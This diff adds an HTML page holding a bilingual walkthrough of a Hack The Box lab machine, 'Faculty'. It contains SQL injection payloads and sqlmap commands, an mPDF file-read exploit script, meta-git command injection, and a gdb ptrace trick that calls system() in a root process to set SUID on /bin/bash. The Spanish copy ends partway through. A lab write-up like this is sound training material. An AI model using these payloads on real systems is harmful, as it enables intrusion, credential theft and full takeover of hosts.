@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>faculty | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">faculty</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a School Faculty Scheduling System on port 80. After discovering multiple login endpoints through web enumeration, I identified a boolean-based blind SQL injection vulnerability in the <code>email</code> parameter of the signup action, allowing me to extract database credentials and user information using <code>sqlmap</code>.</p>
+                    
+                    <p>Using the extracted faculty ID numbers, I gained authenticated access to the admin panel, where I discovered that the application used mPDF 6.0 to generate PDF files. By exploiting a path traversal vulnerability (CVE-2014-2383) in mPDF through annotation tags, I was able to read arbitrary files from the server, including <code>db_connect.php</code>, which contained database credentials that were reused for SSH access as user <code>gbyolo</code>.</p>
+                    
+                    <p>Privilege escalation to <code>developer</code> was achieved by exploiting a command injection vulnerability in the <code>meta-git</code> Node.js library, which <code>gbyolo</code> could execute via <code>sudo</code>. Finally, I escalated to root by abusing the <code>cap_sys_ptrace+ep</code> capability on the <code>gdb</code> binary, which allowed me to attach to a root-owned Python process and inject arbitrary system commands, ultimately setting the SUID bit on <code>/bin/bash</code>.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Boolean-based blind SQL injection, mPDF 6.0 path traversal (annotation file inclusion), meta-git command injection RCE, Linux capabilities abuse (<code>cap_sys_ptrace</code>), GDB process injection.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and services:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing SSH on port 22 and HTTP on port 80" /></p>
+                
+                <p>The scan reveals SSH on port 22 and an HTTP server on port 80. I add <code>faculty.htb</code> to my <code>/etc/hosts</code> file for easier access.</p>
+                
+                <h2>Web Enumeration</h2>
+                <p>Upon accessing the web application, I'm immediately redirected to <code>login.php</code>. Running <code>whatweb</code> provides some initial information about the stack:</p>
+                
+                <pre><code class="language-plaintext">http://faculty.htb [302 Found] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], 
+HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, 
+RedirectLocation[login.php], Script[text/javascript], 
+Title[School Faculty Scheduling System], nginx[1.18.0]
+
+http://faculty.htb/login.php [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, PHP, 
+Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]</code></pre>
+                
+                <p>The application appears to be a School Faculty Scheduling System running on nginx with PHP backend.</p>
+                
+                <h3>Directory Discovery</h3>
+                <p>I perform directory enumeration and discover several interesting endpoints:</p>
+                
+                <pre><code class="language-plaintext">/login.php (Status: 200)
+/index.php (Status: 200)
+/header.php (Status: 200)
+/admin (Status: 200)
+/test.php (Status: 500)
+/topbar.php (Status: 200)</code></pre>
+                
+                <p>Under the <code>/admin</code> directory, I find additional endpoints:</p>
+                
+                <pre><code class="language-plaintext">/admin/login.php (Status: 200)
+/admin/home.php (Status: 200)
+/admin/index.php (Status: 200)
+/admin/ajax.php (Status: 200)
+/admin/download.php (Status: 200)
+/admin/users.php (Status: 200)
+/admin/faculty.php (Status: 200)
+/admin/courses.php (Status: 200)
+/admin/subjects.php (Status: 200)</code></pre>
+                
+                <p>The <code>ajax.php</code> endpoint is particularly interesting as it appears to handle various actions based on URL parameters.</p>
+                
+                <h2>SQL Injection Discovery</h2>
+                <p>Testing the admin login by sending a POST request without credentials reveals error messages that expose the backend code structure:</p>
+                
+                <pre><code class="language-bash">curl -X POST http://faculty.htb/admin/ajax.php?action=login</code></pre>
+                
+                <pre><code class="language-plaintext">Notice: Undefined variable: username in /var/www/scheduling/admin/admin_class.php on line 21
+Notice: Undefined variable: password in /var/www/scheduling/admin/admin_class.php on line 21
+3</code></pre>
+                
+                <p>This error disclosure indicates potential vulnerabilities. I use <code>ffuf</code> to fuzz the <code>action</code> parameter and discover several action endpoints:</p>
+                
+                <pre><code class="language-plaintext">login [Status: 200, Size: 257]
+signup [Status: 200, Size: 913]
+login2 [Status: 200, Size: 661]
+login_faculty [Status: 200]</code></pre>
+                
+                <h3>Identifying the Injection Point</h3>
+                <p>Testing the <code>login_faculty</code> action with a single quote reveals SQL syntax errors:</p>
+                
+                <pre><code class="language-bash">curl -X POST "http://faculty.htb/admin/ajax.php?action=login_faculty" -d "id_no=asd'"</code></pre>
+                
+                <pre><code class="language-plaintext">Notice: Trying to get property 'num_rows' of non-object in 
+/var/www/scheduling/admin/admin_class.php on line 43
+3</code></pre>
+                
+                <p>Similarly, testing the <code>signup</code> action reveals that the <code>email</code> parameter is vulnerable to SQL injection:</p>
+                
+                <pre><code class="language-bash">curl -X POST "http://faculty.htb/admin/ajax.php?action=signup" \
+  -d "firstname=asd&lastname=xd&email=asd@asd.com' OR 1=1 -- a&password=asd"</code></pre>
+                
+                <p>The successful response (return code <code>2</code> without errors) confirms the SQL injection vulnerability.</p>
+                
+                <h3>Automated SQL Injection with SQLMap</h3>
+                <p>Since this is a boolean-based blind SQL injection, manual exploitation would be extremely time-consuming. I use <code>sqlmap</code> to automate the data extraction:</p>
+                
+                <pre><code class="language-bash">sqlmap -u "http://faculty.htb/admin/ajax.php?action=signup" \
+  --data "firstname=asd&lastname=xd&email=asd@asd.com&password=asd" \
+  -p email \
+  --batch \
+  --dbs</code></pre>
+                
+                <p>SQLMap confirms the injection and identifies it as a boolean-based blind and time-based blind injection:</p>
+                
+                <pre><code class="language-plaintext">Parameter: email (POST)
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: firstname=asd&lastname=xd&email=asd@asd.com' AND 2982=2982 AND 'XlGZ'='XlGZ&password=asd
+
+Type: time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+Payload: firstname=asd&lastname=xd&email=asd@asd.com' AND (SELECT 8055 FROM (SELECT(SLEEP(5)))KTnc) 
+AND 'UKhI'='UKhI&password=asd</code></pre>
+                
+                <p>The tool discovers two databases:</p>
+                
+                <pre><code class="language-plaintext">available databases [2]:
+[*] information_schema
+[*] scheduling_db</code></pre>
+                
+                <h3>Extracting Database Contents</h3>
+                <p>I enumerate the <code>scheduling_db</code> database structure using multiple threads to speed up the process:</p>
+                
+                <pre><code class="language-bash">sqlmap -u "http://faculty.htb/admin/ajax.php?action=signup" \
+  --data "firstname=asd&lastname=xd&email=asd@asd.com&password=asd" \
+  -p email \
+  --batch \
+  -D scheduling_db --tables --threads=10</code></pre>
+                
+                <p>The most interesting tables are <code>users</code> and <code>faculty</code>. From the <code>users</code> table, I extract:</p>
+                
+                <pre><code class="language-plaintext">+----+---------------+------+----------------------------------+----------+
+| id | name          | type | password                         | username |
++----+---------------+------+----------------------------------+----------+
+| 1  | Administrator | 1    | 1fecbe762af147c1176a0fc2c722a345 | admin    |
++----+---------------+------+----------------------------------+----------+</code></pre>
+                
+                <p>From the <code>faculty</code> table, I extract ID numbers and email addresses:</p>
+                
+                <pre><code class="language-plaintext">+----+----------+--------------------+--------+----------+-----------+
+| id | id_no    | email              | gender | lastname | firstname |
++----+----------+--------------------+--------+----------+-----------+
+| 1  | 63033226 | jsmith@faculty.htb | Male   | Smith    | John      |
+| 2  | 85662050 | cblake@faculty.htb | Female | Blake    | Claire    |
+| 3  | 30903070 | ejames@faculty.htb | Male   | James    | Eric      |
++----+----------+--------------------+--------+----------+-----------+</code></pre>
+                
+                <h2>Accessing the Admin Panel</h2>
+                <p>Using the SQL injection vulnerability in the admin login form at <code>/admin/login.php</code>, I bypass authentication by injecting a payload that always returns true:</p>
+                
+                <pre><code class="language-sql">username=admin' OR 1=1 -- -&password=anything</code></pre>
+                
+                <p>This grants me access to the administrative dashboard where I can manage users, courses, subjects, and schedules.</p>
+                
+                <h2>mPDF Path Traversal Exploitation</h2>
+                <p>Within the admin panel, I discover a feature that generates PDF reports for users, courses, and subjects. After generating a PDF, the application redirects to a URL like:</p>
+                
+                <pre><code class="language-plaintext">http://faculty.htb/mpdf/tmp/OKNbfJXeKoB0kPqTWEQdx1FG6u.pdf</code></pre>
+                
+                <p>Inspecting the PDF metadata in the browser console reveals version information:</p>
+                
+                <pre><code class="language-plaintext">PDF 201248ef05d65e5b98fba972750dec2a [1.4 mPDF 6.0 / -] (PDF.js: 5.2.183 [3f1ecc1ba])</code></pre>
+                
+                <p>The application uses <strong>mPDF 6.0</strong>, which is vulnerable to a path traversal attack through annotation tags. I find a proof-of-concept exploit at <a href="https://www.exploit-db.com/exploits/50995">https://www.exploit-db.com/exploits/50995</a>.</p>
+                
+                <h3>Understanding the mPDF Vulnerability</h3>
+                <p>The vulnerability allows an attacker to include arbitrary files from the server filesystem by crafting a malicious annotation tag in the HTML that gets converted to PDF. The annotation's <code>file</code> attribute can reference local files using path traversal sequences.</p>
+                
+                <h3>Crafting the Exploit</h3>
+                <p>I modify the exploit to work with this specific application. The exploit logic is:</p>
+                
+                <pre><code class="language-python">from urllib.parse import quote
+from base64 import b64encode
+import requests
+import os
+
+fname = "/etc/passwd"  # Target file to read
+
+payload = f'&lt;annotation file="{fname}" content="{fname}" icon="Graph" title="Attached File: {fname}" pos-x="195" /&gt;'
+encoded_payload = quote(payload)
+base64enc = b64encode(encoded_payload.encode())
+
+posturl = "http://faculty.htb/admin/download.php"
+data = {"pdf": base64enc}
+
+postresponse = requests.post(posturl, data=data)
+pdf_filename = postresponse.text
+
+os.system(f"curl -o xd.pdf http://faculty.htb/mpdf/tmp/{pdf_filename}")
+os.system("pdfdetach -list xd.pdf")
+os.system("pdfdetach -save 1 -o file.txt xd.pdf")
+os.system("cat file.txt")
+os.system("rm xd.pdf file.txt")</code></pre>
+                
+                <p>This script:</p>
+                <ol>
+                    <li>Creates a malicious annotation tag pointing to the target file</li>
+                    <li>URL-encodes and base64-encodes the payload</li>
+                    <li>POSTs it to the <code>download.php</code> endpoint</li>
+                    <li>Downloads the generated PDF</li>
+                    <li>Extracts the attached file from the PDF using <code>pdfdetach</code></li>
+                    <li>Displays the file contents</li>
+                </ol>
+                
+                <h3>Reading Sensitive Files</h3>
+                <p>Using this technique, I can read arbitrary files from the server. I discover that besides <code>root</code>, there are two users with bash shells:</p>
+                
+                <pre><code class="language-plaintext">gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
+developer:x:1001:1002:,,,:/home/developer:/bin/bash</code></pre>
+                
+                <p>I target the application's database configuration file at <code>/var/www/scheduling/admin/db_connect.php</code> and successfully extract it:</p>
+                
+                <pre><code class="language-php">$conn = new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')</code></pre>
+                
+                <p>This reveals database credentials: <code>sched:Co.met06aci.dly53ro.per</code></p>
+                
+                <h2>SSH Access as gbyolo</h2>
+                <p>Testing the database password against the discovered users, I find that it's reused for SSH access:</p>
+                
+                <pre><code class="language-bash">ssh gbyolo@faculty.htb
+# Password: Co.met06aci.dly53ro.per</code></pre>
+                
+                <p>I successfully gain SSH access as <code>gbyolo</code> and retrieve the user flag.</p>
+                
+                <h3>Post-Exploitation Enumeration</h3>
+                <p>Upon logging in, I notice a mail notification. Checking the mail reveals:</p>
+                
+                <pre><code class="language-plaintext">Hi gbyolo, you can now manage git repositories belonging to the faculty group. 
+Please check and if you have troubles just let me know!
+\ndeveloper@faculty.htb</code></pre>
+                
+                <p>This suggests that <code>gbyolo</code> has some git-related privileges. Checking <code>sudo</code> permissions confirms this:</p>
+                
+                <pre><code class="language-bash">sudo -l</code></pre>
+                
+                <pre><code class="language-plaintext">Matching Defaults entries for gbyolo on faculty:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User gbyolo may run the following commands on faculty:
+    (developer) /usr/local/bin/meta-git</code></pre>
+                
+                <p>I can execute <code>/usr/local/bin/meta-git</code> as the <code>developer</code> user. Investigating this binary:</p>
+                
+                <pre><code class="language-bash">file /usr/local/bin/meta-git</code></pre>
+                
+                <pre><code class="language-plaintext">/usr/local/bin/meta-git: symbolic link to ../lib/node_modules/meta-git/bin/meta-git</code></pre>
+                
+                <p>It's a Node.js library for managing git repositories.</p>
+                
+                <h2>Privilege Escalation to Developer</h2>
+                <h3>meta-git Command Injection Vulnerability</h3>
+                <p>Searching for vulnerabilities in <code>meta-git</code>, I find a HackerOne report (<a href="https://hackerone.com/reports/728040">https://hackerone.com/reports/728040</a>) detailing a command injection vulnerability in the <code>clone</code> command. The vulnerability allows arbitrary command execution through special characters in the repository name.</p>
+                
+                <p>The proof-of-concept is straightforward:</p>
+                
+                <pre><code class="language-bash">meta-git clone 'sss||touch HACKED'</code></pre>
+                
+                <p>Testing this confirms the vulnerability. To get a shell as <code>developer</code>, I navigate to <code>/tmp</code> (to avoid directory-related errors) and execute:</p>
+                
+                <pre><code class="language-bash">cd /tmp
+sudo -u developer meta-git clone 'sss||bash'</code></pre>
+                
+                <pre><code class="language-plaintext">meta git cloning into 'sss||bash' at sss||bash
+sss||bash:
+fatal: repository 'sss' does not exist
+bash: sss: No such file or directory
+developer@faculty:/tmp$</code></pre>
+                
+                <p>Despite the error messages, I successfully obtain a shell as <code>developer</code>:</p>
+                
+                <pre><code class="language-bash">id</code></pre>
+                
+                <pre><code class="language-plaintext">uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)</code></pre>
+                
+                <p>The <code>developer</code> user belongs to three groups: <code>developer</code>, <code>debug</code>, and <code>faculty</code>.</p>
+                
+                <h2>Privilege Escalation to Root</h2>
+                <h3>Investigating the debug Group</h3>
+                <p>I search for files and binaries accessible to the <code>debug</code> group:</p>
+                
+                <pre><code class="language-bash">find / -group debug 2>/dev/null</code></pre>
+                
+                <pre><code class="language-plaintext">/usr/bin/gdb</code></pre>
+                
+                <p>The <code>gdb</code> debugger binary is owned by <code>root</code> but executable by the <code>debug</code> group:</p>
+                
+                <pre><code class="language-bash">ls -la /usr/bin/gdb</code></pre>
+                
+                <pre><code class="language-plaintext">-rwxr-x--- 1 root debug 8440200 Dec 8 2021 /usr/bin/gdb</code></pre>
+                
+                <p>More importantly, checking the capabilities of this binary reveals a critical privilege:</p>
+                
+                <pre><code class="language-bash">getcap /usr/bin/gdb</code></pre>
+                
+                <pre><code class="language-plaintext">/usr/bin/gdb = cap_sys_ptrace+ep</code></pre>
+                
+                <h3>Understanding cap_sys_ptrace</h3>
+                <p>The <code>cap_sys_ptrace</code> capability allows a process to trace and debug any process on the system, including those owned by root. This means I can use <code>gdb</code> to attach to a root-owned process and inject arbitrary code.</p>
+                
+                <h3>Finding a Suitable Target Process</h3>
+                <p>I need to find a root process that I can reliably exploit. The ideal target would be a Python process that has already imported the <code>os</code> module, allowing me to execute system commands. I search for such a process:</p>
+                
+                <pre><code class="language-bash">ps -faux | grep "^root" | grep python</code></pre>
+                
+                <pre><code class="language-plaintext">root  691  0.0  0.9  26896  18068  ?  Ss  00:11  0:00  /usr/bin/python3 /usr/bin/networkd-dispatcher 
+--run-startup-triggers</code></pre>
+                
+                <p>The <code>networkd-dispatcher</code> service runs as root with Python 3. Verifying that it imports the <code>os</code> module:</p>
+                
+                <pre><code class="language-bash">head -20 /usr/bin/networkd-dispatcher</code></pre>
+                
+                <pre><code class="language-python">#!/usr/bin/python3
+# networkd-dispatcher
+(...)
+import os</code></pre>
+                
+                <p>Perfect! This process imports <code>os</code>, which means I can use <code>gdb</code> to call the <code>system()</code> function.</p>
+                
+                <h3>GDB Process Injection</h3>
+                <p>I attach <code>gdb</code> to the target process (PID 691):</p>
+                
+                <pre><code class="language-bash">gdb -q -p 691</code></pre>
+                
+                <p>Within <code>gdb</code>, I can now call system functions in the context of the root-owned process. First, I verify command execution:</p>
+                
+                <pre><code class="language-gdb">(gdb) call (void)system("whoami > /tmp/test")</code></pre>
+                
+                <pre><code class="language-plaintext">[Detaching after vfork from child process 6305]</code></pre>
+                
+                <p>Checking the output file:</p>
+                
+                <pre><code class="language-bash">cat /tmp/test</code></pre>
+                
+                <pre><code class="language-plaintext">root</code></pre>
+                
+                <p>Excellent! Commands are executing as root. Now I can escalate to root by setting the SUID bit on <code>/bin/bash</code>:</p>
+                
+                <pre><code class="language-gdb">(gdb) call (void)system("chmod u+s /bin/bash")</code></pre>
+                
+                <p>Exiting <code>gdb</code> and spawning a privileged bash shell:</p>
+                
+                <pre><code class="language-bash">bash -p</code></pre>
+                
+                <pre><code class="language-bash">whoami</code></pre>
+                
+                <pre><code class="language-plaintext">root</code></pre>
+                
+                <p>I now have root access and can retrieve the root flag to complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba un School Faculty Scheduling System en el puerto 80. Tras descubrir múltiples endpoints de login mediante enumeración web, identifiqué una vulnerabilidad de inyección SQL boolean-based blind en el parámetro <code>email</code> de la acción signup, permitiéndome extraer credenciales de base de datos e información de usuarios usando <code>sqlmap</code>.</p>
+                    
+                    <p>Usando los números de ID de faculty extraídos, obtuve acceso autenticado al panel de administración, donde descubrí que la aplicación usaba mPDF 6.0 para generar archivos PDF. Explotando una vulnerabilidad de path traversal (CVE-2014-2383) en mPDF mediante etiquetas de anotación, pude leer archivos arbitrarios del servidor, incluyendo <code>db_connect.php</code>, que contenía credenciales de base de datos reutilizadas para acceso SSH como usuario <code>gbyolo</code>.</p>
+                    
+                    <p>La escalada de privilegios a <code>developer</code> se consiguió explotando una vulnerabilidad de inyección de comandos en la librería de Node.js <code>meta-git</code>, que <code>gbyolo</code> podía ejecutar mediante <code>sudo</code>. Finalmente, escalé a root abusando de la capability <code>cap_sys_ptrace+ep</code> en el binario <code>gdb</code>, lo cual me permitió attacharme a un proceso Python propiedad de root e inyectar comandos arbitrarios del sistema, estableciendo finalmente el bit SUID en <code>/bin/bash</code>.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Inyección SQL boolean-based blind, path traversal en mPDF 6.0 (inclusión de archivos mediante anotaciones), RCE por inyección de comandos en meta-git, abuso de capabilities de Linux (<code>cap_sys_ptrace</code>), inyección de procesos con GDB.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo de nmap mostrando SSH en el puerto 22 y HTTP en el puerto 80" /></p>
+                
+                <p>El escaneo revela SSH en el puerto 22 y un servidor HTTP en el puerto 80. Añado <code>faculty.htb</code> a mi archivo <code>/etc/hosts</code> para facilitar el acceso.</p>
+                
+                <h2>Enumeración Web</h2>
+                <p>Al acceder a la aplicación web, inmediatamente me redirige a <code>login.php</code>. Ejecutando <code>whatweb</code> obtengo información inicial sobre el stack:</p>
+                
+                <pre><code class="language-plaintext">http://faculty.htb [302 Found] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], 
+HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, 
+RedirectLocation[login.php], Script[text/javascript], 
+Title[School Faculty Scheduling System], nginx[1.18.0]
+
+http://faculty.htb/login.php [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, PHP, 
+Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]</code></pre>
+                
+                <p>La aplicación parece ser un School Faculty Scheduling System ejecutándose en nginx con backend PHP.</p>
+                
+                <h3>Descubrimiento de Directorios</h3>
+                <p>Realizo enumeración de directorios y descubro varios endpoints interesantes:</p>
+                
+                <pre><code class="language-plaintext">/login.php (Status: 200)
+/index.php (Status: 200)
+/header.php (Status: 200)
+/admin (Status: 200)
+/test.php (Status: 500)
+/topbar.php (Status: 200)</code></pre>
+                
+                <p>Bajo el directorio <code>/admin</code>, encuentro endpoints adicionales:</p>
+                
+                <pre><code class="language-plaintext">/admin/login.php (Status: 200)
+/admin/home.php (Status: 200)
+/admin/index.php (Status: 200)
+/admin/ajax.php (Status: 200)
+/admin/download.php (Status: 200)
+/admin/users.php (Status: 200)
+/admin/faculty.php (Status: 200)
+/admin/courses.php (Status: 200)
+/admin/subjects.php (Status: 200)</code></pre>
+                
+                <p>El endpoint <code>ajax.php</code> es particularmente interesante ya que parece manejar varias acciones basadas en parámetros URL.</p>
+                
+                <h2>Descubrimiento de Inyección SQL</h2>
+                <p>Probando el login de admin enviando una petición POST sin credenciales revela mensajes de error que exponen la estructura del código backend:</p>
+                
+                <pre><code class="language-bash">curl -X POST http://faculty.htb/admin/ajax.php?action=login</code></pre>
+                
+                <pre><code class="language-plaintext">Notice: Undefined variable: username in /var/www/scheduling/admin/admin_class.php on line 21
+Notice: Undefined variable: password in /var/www/scheduling/admin/admin_class.php on line 21
+3</code></pre>
+                
+                <p>Esta divulgación de errores indica potenciales vulnerabilidades. Uso <code>ffuf</code> para fuzzear el parámetro <code>action</code> y descubro varios endpoints de acción:</p>
+                
+                <pre><code class="language-plaintext">login [Status: 200, Size: 257]
+signup [Status: 200, Size: 913]
+login2 [Status: 200, Size: 661]
+login_faculty [Status: 200]</code></pre>
+                
+                <h3>Identificando el Punto de Inyección</h3>
+                <p>Probando la acción <code>login_faculty</code> con una comilla simple revela errores de sintaxis SQL:</p>
+                
+                <pre><code class="language-bash">curl -X POST "http://faculty.htb/admin/ajax.php?action=login_faculty" -d "id_no=asd'"</code></pre>
+                
+                <pre><code class="language-plaintext">Notice: Trying to get property 'num_rows' of non-object in 
+/var/www/scheduling/admin/admin_class.php on line 43
+3</code></pre>
+                
+                <p>Similarmente, probando la acción <code>signup</code> revela que el parámetro <code>email</code> es vulnerable a inyección SQL:</p>
+                
+                <pre><code class="language-bash">curl -X POST "http://faculty.htb/admin/ajax.php?action=signup" \
+  -d "firstname=asd&lastname=xd&email=asd@asd.com' OR 1=1 -- a&password=asd"</code></pre>
+                
+                <p>La respuesta exitosa (código de retorno <code>2</code> sin errores) confirma la vulnerabilidad de inyección SQL.</p>
+                
+                <h3>Inyección SQL Automatizada con SQLMap</h3>
+                <p>Ya que se trata de una inyección SQL boolean-based blind, la explotación manual sería extremadamente consumidora de tiempo. Uso <code>sqlmap</code> para automatizar la extracción de datos:</p>
+                
+                <pre><code class="language-bash">sqlmap -u "http://faculty.htb/admin/ajax.php?action=signup" \
+  --data "firstname=asd&lastname=xd&email=asd@asd.com&password=asd" \
+  -p email \
+  --batch \
+  --dbs</code></pre>
+                
+                <p>SQLMap confirma la inyección y la identifica como boolean-based blind y time-based blind:</p>
+                
+                <pre><code class="language-plaintext">Parameter: email (POST)
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: firstname=asd&lastname=xd&email=asd@asd.com' AND 2982=2982 AND 'XlGZ'='XlGZ&password=asd
+
+Type: time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+Payload: firstname=asd&lastname=xd&email=asd@asd.com' AND (SELECT 8055 FROM (SELECT(SLEEP(5)))KTnc) 
+AND 'UKhI'='UKhI&password=asd</code></pre>
+                
+                <p>La herramienta descubre dos bases de datos:</p>
+                
+                <pre><code class="language-plaintext">available databases [2]:
+[*] information_schema
+[*] scheduling_db</code></pre>
+                
+                <h3>Extrayendo el Contenido de la Base de Datos</h3>
+                <p>Enumero la estructura de la base de datos <code>scheduling_db</code> usando múltiples hilos para acelerar el proceso:</p>
+                
+                <pre><code class="language-bash">sqlmap -u "http://faculty.htb/admin/ajax.php?action=signup" \
+  --data "firstname=asd&lastname=xd&email=asd@asd.com&password=asd" \
+  -p email \
+  --batch \
+  -D scheduling_db --tables --threads=10</code></pre>
+                
+                <p>Las tablas más interesantes son <code>users</code> y <code>faculty</code>. De la tabla <code>users</code>, extraigo:</p>
+                
+                <pre><code class="language-plaintext">+----+---------------+------+----------------------------------+----------+
+| id | name          | type | password                         | username |
++----+---------------+------+----------------------------------+----------+
+| 1  | Administrator | 1    | 1fecbe762af147c1176a0fc2c722a345 | admin    |
++----+---------------+------+----------------------------------+----------+</code></pre>
+                
+                <p>De la tabla <code>faculty</code>, extraigo números de ID y direcciones de correo:</p>
+                
+                <pre><code class="language-plaintext">+----+----------+--------------------+--------+----------+-----------+
+| id | id_no    | email              | gender | lastname | firstname |
++----+----------+--------------------+--------+----------+-----------+
+| 1  | 63033226 | jsmith@faculty.htb | Male   | Smith    | John      |
+| 2  | 85662050 | cblake@faculty.htb | Female | Blake    | Claire    |
+| 3  | 30903070 | ejames@faculty.htb | Male   | James    | Eric      |
++----+----------+--------------------+--------+----------+-----------+</code></pre>
+                
+                <h2>Accediendo al Panel de Administración</h2>
+                <p>Usando la vulnerabilidad de inyección SQL en el formulario de login de admin en <code>/admin/login.php</code>, bypaseo la autenticación inyectando un payload que siempre retorna verdadero:</p>
+                
+                <pre><code class="language-sql">username=admin' OR 1=1 -- -&password=anything</code></pre>
+                
+                <p>Esto me otorga acceso al dashboard administrativo donde puedo gestionar usuarios, cursos, asignaturas y horarios.</p>
+                
+                <h2>Explotación de Path Traversal en mPDF</h2>
+                <p>Dentro del panel de admin, descubro una funcionalidad que genera informes PDF de usuarios, cursos y asignaturas. Después de generar un PDF, la aplicación redirige a una URL como:</p>
+                
+                <pre><code class="language-plaintext">http://faculty.htb/mpdf/tmp/OKNbfJXeKoB0kPqTWEQdx1FG6u.pdf</code></pre>
+                
+                <p>Inspeccionando los metadatos del PDF en la consola del navegador revela información de versión:</p>
+                
+                <pre><code class="language-plaintext">PDF 201248ef05d65e5b98fba972750dec2a [1.4 mPDF 6.0 / -] (PDF.js: 5.2.183 [3f1ecc1ba])</code></pre>
+                
+                <p>La aplicación usa <strong>mPDF 6.0</strong>, que es vulnerable a un ataque de path traversal mediante etiquetas de anotación. Encuentro una prueba de concepto del exploit en <a href="https://www.exploit-db.com/exploits/50995">https://www.exploit-db.com/exploits/50995</a>.</p>
+                
+                <h3>Entendiendo la Vulnerabilidad de mPDF</h3>
+                <p>La vulnerabilidad permite a un atacante incluir archivos arbitrarios del sistema de archivos del servidor diseñando una etiqueta de anotación maliciosa en el HTML que se convierte a PDF. El atributo <code>file</code> de la anotación puede referenciar archivos locales usando secuencias de path traversal.</p>
+                
+                <h3>Diseñando el Exploit</h3>
+                <p>Modifico el exploit para que funcione con esta aplicación específica. La lógica del exploit es:</p>
+                
+                <pre><code class="language-python">from urllib.parse import quote
+from base64 import b64encode
+import requests
+import os
+
+fname = "/etc/passwd"  # Archivo objetivo a leer
+
+payload = f'&lt;annotation file="{fname}" content="{fname}" icon="Graph" title="Attached File: {fname}" pos-x="195" /&gt;'
+encoded_payload = quote(payload)
+base64enc = b64encode(encoded_payload.encode())
+
+posturl = "http://faculty.htb/admin/download.php"
+data = {"pdf": base64enc}
+
+postresponse = requests.post(posturl, data=data)
+pdf_filename = postresponse.text
+
+os.system(f"curl -o xd.pdf http://faculty.htb/mpdf/tmp/{pdf_filename}")
+os.system("pdfdetach -list xd.pdf")
+os.system("pdfdetach -save 1 -o file.txt xd.pdf")
+os.system("cat file.txt")
+os.system("rm xd.pdf file.txt")</code></pre>
+                
+                <p>Este script:</p>
+                <ol>
+                    <li>Crea una etiqueta de anotación maliciosa apuntando al archivo objetivo</li>
+                    <li>URL-codifica y base64-codifica el payload</li>
+                    <li>Lo envía mediante POST al endpoint <code>download.php</code></li>
+                    <li>Descarga el PDF generado</li>
+                    <li>Extrae el archivo adjunto del PDF usando <code>pdfdetach</code></li>
+                    <li>Muestra el contenido del archivo</li>
+                </ol>
+                
+                <h3>Leyendo Archivos Sensibles</h3>
+                <p>Usando esta técnica, puedo leer archivos arbitrarios del servidor. Descubro que además de <code>root</code>, hay dos usuarios con shells bash:</p>
+                
+                <pre><code class="language-plaintext">gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
+developer:x:1001:1002:,,,:/home/developer:/bin/bash</code></pre>
+                
+                <p>Apunto al archivo de configuración de base de datos de la aplicación en <code>/var/www/scheduling/admin/db_connect.php</code> y lo extraigo exitosamente:</p>
+                
